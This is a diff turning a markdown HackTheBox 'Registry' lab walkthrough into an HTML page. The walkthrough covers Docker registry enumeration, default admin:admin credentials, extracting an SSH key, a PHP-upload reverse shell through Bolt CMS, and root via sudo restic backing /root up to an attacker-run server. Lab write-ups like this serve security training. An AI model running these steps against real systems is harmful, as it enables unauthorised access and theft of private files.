@@ -28,7 +28,75 @@
                     </div>
                 </nav>
             </header>
-            <main>
+            <main class="mt-5">
+                <section class="header"> 
+                    <div class="container">
+                        <h6 class="subheader mb-0 pb-0">HackTheBox - Linux - Hard</h6>
+                        <h1 class="mt-0 pt-0 mb-4">Registry</h1>
+                    </div>
+                </section>
+                <section class="user-part"> 
+                    <div class="container">
+                        <h2>USER</h2>
+                        <p>added docker.registry.htb to hosts 
+                        and starget gobuster against https on port 443</p>
+
+                        <p>fond a path to /v2</p>
+
+                        <p>and read the HTTP response header which said: 
+                        Docker-Distribution-Api-Version   registry/2.0</p>
+
+                        <p>it meant that this box is running docker and turned out /v2 stands for API</p>
+
+                        <p>to get image name GET this path /v2/_catalog</p>
+
+                        <p>to make docker pull working 1st we need to setup cert which is done with this command:</p>
+<pre>openssl s_client -showcerts -connect docker.registry.htb:443 < /dev/null | sed \
+    -ne '/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p' > /etc/docker/certs.d/docker.registry.htb/ca.crt</pre>
+
+      
+<p>Login creds were simple: admin:admin</p>
+<pre>docker login -u admin -p admin docker.registry.htb:443/bolt-image</pre>
+
+<p>Now i can pull the container:</p>
+<pre>docker pull docker.registry.htb:443/bolt-image</pre>
+
+<p>Let's run it and see what's inside.</p>
+<pre>docker run -it 601499e98a60i</pre>
+
+<p>Now I can grab id_rsa for bolt user but it has a pass phrase</p>
+<p>Also I have found out that <code>/var/www/html/sync.sh</code> uses ssh but  runs without any pass phrase</p>
+<p>I checked <code>.viminfo</code> and found the last edited file and that's the file with the pass phrase..</p>
+                    </div>
+                </section>
+                <section class="root-part">
+                    <div class="container">
+                        <h2>ROOT</h2>
+
+                        <p>fond webapp in /var/www/html got admin hash from it's database and used it here:</p>
+                        <p>http://registry.htb/bolt/bolt/login</p>
+
+                        <p>go to main configuration and allow php uploads<br>
+                        using shell_exec() setup a listening nc connecion and connect to<br> 
+                        the remote listener from attacker's box to get a rev shell as www-data</p>
+
+                        <p>this user can sudo a command without a password:</p>
+                        <pre>sudo /usr/bin/restic backup -r rest*</pre>
+
+                        <p>which means we can setup a listening restic server and backup any directory or file to our server
+                        fetch go server from restic-server github repo and build a binary (optionally compress it with upx -9)</p>
+
+                        <p>create a temporary dir for out new repo like this</p>
+                        <pre>restic init --repo ./tmp</pre>
+
+                        <p>and serv the repo: restic-server --path ./tmp --no-authi<br>
+                        backup the /root dir:</p> 
+                        <pre>sudo /usr/bin/restic backup -r rest:http://localhost:8000/ /root</pre>
+                        <p>restore the repo:</p><pre>mkdir restore && restic -r ./tmp restore latest --target ./restore</pre>
+                        ..<h2>rooted!</h2>
+                        </pre>
+                    </div>
+                </section>
             </main>
         </div>
         <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js" 
@@ -39,59 +107,3 @@
             integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
     </body>
 </html>
-## USER 
-
-added docker.registry.htb to hosts 
-and starget gobuster against https on port 443
-
-fond a path to /v2
-
-and read the HTTP response header which said: 
-Docker-Distribution-Api-Version   registry/2.0
-
-it meant that this box is running docker and turned out /v2 stands for API 
-
-to get image name GET this path /v2/_catalog
-
-to make docker pull working 1st we need to setup cert which is done with this command:
-openssl s_client -showcerts -connect docker.registry.htb:443 < /dev/null | sed \
-    -ne '/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p' > /etc/docker/certs.d/docker.registry.htb/ca.crt
-
-      
-after that login with admin:admin
-docker login -u admin -p admin docker.registry.htb:443/bolt-image
-
-now image can be pulled:
-docker pull docker.registry.htb:443/bolt-image
-
-run it and see what's inside.
-docker run -it 601499e98a60
-
-greb the id_rsa for bolt user
-check /var/www/html/sync.sh and see that it runs without a passphrase 
-check .viminfo and find the last edited file. 
-that's the file with the pass phrase..
-
-#ROOT
-
-fond webapp in /var/www/html got admin hash from it's database and used it here:
-http://registry.htb/bolt/bolt/login 
-
-go to main configuration and allow php uploads
-using shell_exec() setup a listening nc connecion and connect to 
-the remote listener from attacker's box to get a rev shell as www-data
-
-this user can sudo a command without a password:
-sudo /usr/bin/restic backup -r rest*
-
-which means we can setup a listening restic server and backup any directory or file to our server
-fetch go server from restic-server github repo and build a binary (optionally compress it with upx -9)
-
-create a temporary dir for out new repo like this
-restic init --repo ./tmp
-
-and serv the repo: restic-server --path ./tmp --no-auth
-backup the /root dir: sudo /usr/bin/restic backup -r rest:http://localhost:8000/ /root
-restore the repo: mkdir restore && restic -r ./tmp restore latest --target ./restore
-
-rooted..
